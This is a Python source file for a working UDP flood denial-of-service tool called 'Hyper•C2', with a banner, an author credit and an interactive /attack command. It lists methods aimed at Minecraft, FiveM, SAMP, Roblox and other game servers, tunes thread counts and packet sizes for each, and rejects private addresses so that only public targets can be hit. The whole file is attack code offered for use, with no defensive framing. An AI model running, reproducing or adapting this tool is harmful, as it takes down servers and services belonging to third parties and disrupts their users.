import os
import socket
import threading
import time
from random import randint
import re

# Banner
banner = """
.##.....##.##....##.########..########.########...######...#######.
.##.....##..##..##..##.....##.##.......##.....##.##....##.##.....##
.##.....##...####...##.....##.##.......##.....##.##..............##
.#########....##....########..######...########..##........#######.
.##.....##....##....##........##.......##...##...##.......##.......
.##.....##....##....##........##.......##....##..##....##.##.......
.##.....##....##....##........########.##.....##..######..#########
"""

info = """
                     Script by: @lulumina
                          power: luxozaion
                        discord: lulumina
"""

methods_text = """
        /methods

        Hyper•C2 >>
        UDPPPS      - Flood UDP De alta Frequência
        UDPPACKETS  - Pacotes UDP massivos
        UDPKILL     - UDP com 1M de pacotes
        UDP-GAME    - Ataque a todos os jogos
        MCPE        - Dropping all servers Minecraft
        UDP-MIX     - Combinação de métodos UDP
        FIVEM       - Ataque a servidores Fivem
        MTA         - Ataque a servidores Multi Theft Auto
        SAMP        - Ataque a servidores San Andreas MP
        ROBLOX      - Ataque a servidores Roblox
        RAKNET      - RakNet custom packet attack
        UDPFLURY    - Flurry UDP massivo
        UDPNUCLEAR  - Pacotes gigantes
        UDPSHIELD   - Evasão de proteção simples
        PACKETSBRUTE - Força bruta de pacotes
        UDPGOOD     - Ataque limpo e eficiente
        UDPBYPASS   - Envio contínuo com variações

        Uso: /attack [ip] [port] [method] [time]
"""

print(banner)
print(info)

def show_prompt():
    print(methods_text)

# Validador de IP pública
def is_valid_public_ip(ip):
    regex = r"^\d{1,3}(\.\d{1,3}){3}$"
    if not re.match(regex, ip):
        return False
    parts = list(map(int, ip.split(".")))
    if parts[0] == 127 or parts[0] == 0:
        return False
    if parts[0] == 10:
        return False
    if parts[0] == 192 and parts[1] == 168:
        return False
    if parts[0] == 172 and 16 <= parts[1] <= 31:
        return False
    return all(0 <= part <= 255 for part in parts)

# Parametrización de threads y tamaño de paquete por método,
# ajustado para 2 cores y 8GB RAM (nano 8.5 codespace)
# Los métodos menos intensivos usan menos threads/paquetes.
METHOD_CONFIG = {
    "UDPPPS":        {"threads": 5,   "force": 1024},
    "UDPPACKETS":    {"threads": 5,   "force": 1400},
    "UDPKILL":       {"threads": 5,   "force": 2052},
    "UDP-GAME":      {"threads": 32,   "force": 3072},
    "MCPE":          {"threads": 24,   "force": 2048},
    "UDP-MIX":       {"threads": 60,   "force": 6144},
    "FIVEM":         {"threads": 28,   "force": 2048},
    "MTA":           {"threads": 28,   "force": 2048},
    "SAMP":          {"threads": 28,   "force": 2048},
    "ROBLOX":        {"threads": 24,   "force": 2048},
    "RAKNET":        {"threads": 16,   "force": 1024},
    "UDPFLURY":      {"threads": 90,   "force": 12288},
    "UDPNUCLEAR":    {"threads": 100,  "force": 16384},
    "UDPSHIELD":     {"threads": 48,   "force": 8192},
    "PACKETSBRUTE":  {"threads": 70,   "force": 8192},
    "UDPGOOD":       {"threads": 36,   "force": 4096},
    "UDPBYPASS":     {"threads": 36,   "force": 4096},
}

# Brutalize class
class Brutalize:
    def __init__(self, ip, port, force=4096, threads=40):
        self.ip = ip
        self.port = port
        self.force = force
        self.threads = threads
        self.client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)
        self.on = False
        self.sent = 0
        self.total = 0

    def flood(self, duration):
        self.on = True
        self.sent = 0
        self.total = 0

        thread_list = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.send)
            t.daemon = True
            t.start()
            thread_list.append(t)

        info_thread = threading.Thread(target=self.info)
        info_thread.daemon = True
        info_thread.start()

        time.sleep(duration)
        self.on = False

        info_thread.join(timeout=1)
        for t in thread_list:
            t.join(timeout=0.1)

    def info(self):
        interval = 0.1
        now = time.time()
        size = 0
        mb = 1000000
        gb = 1000000000

        while self.on:
            time.sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent / gb * interval
                print(f"[i] {round(size)} Mb/s - Total: {round(self.total, 1)} Gb", end='\r')

            now2 = time.time()
            if now + 1 >= now2:
                continue

            size = round(self.sent / mb)
            self.sent = 0
            now += 1

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, (self.ip, self._randport()))
                self.sent += self.len
            except Exception:
                pass

    def _randport(self):
        return self.port or randint(1, 65535)

def get_method_config(method):
    # Devuelve threads y force según método, con defaults seguros para 2c/8GB
    cfg = METHOD_CONFIG.get(method, {"threads": 20, "force": 2048})
    return cfg["threads"], cfg["force"]

# Ejecuta un ataque
def launch_attack(ip, port, method, duration):
    valid_methods = list(METHOD_CONFIG.keys())

    if method not in valid_methods:
        print("[!] Método inválido.")
        return

    if not is_valid_public_ip(ip):
        print("[!] IP inválida, local ou domínio detectado. Use apenas IPs públicos válidos.")
        return

    threads, force = get_method_config(method)
    print(f"[+] Ataque iniciado con método {method} ({threads} threads, paquete {force} bytes) por {duration}s")
    attack = Brutalize(ip, port, force=force, threads=threads)
    attack.flood(duration)
    print("\n[+] Ataque realizado con sucesso!")

# Main loop
def main():
    while True:
        print("Hyper•C2 >> ", end="")
        cmd = input().strip()

        if cmd == "/methods":
            show_prompt()

        elif cmd.startswith("/attack"):
            args = cmd.split()
            if len(args) != 5:
                print("[!] Uso: /attack [ip] [port] [method] [time]")
                continue

            ip = args[1]
            port = int(args[2])
            method = args[3].upper()
            duration = int(args[4])

            launch_attack(ip, port, method, duration)

        else:
            print("[!] Comando inválido. Use /methods ou /attack.")

if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    main()
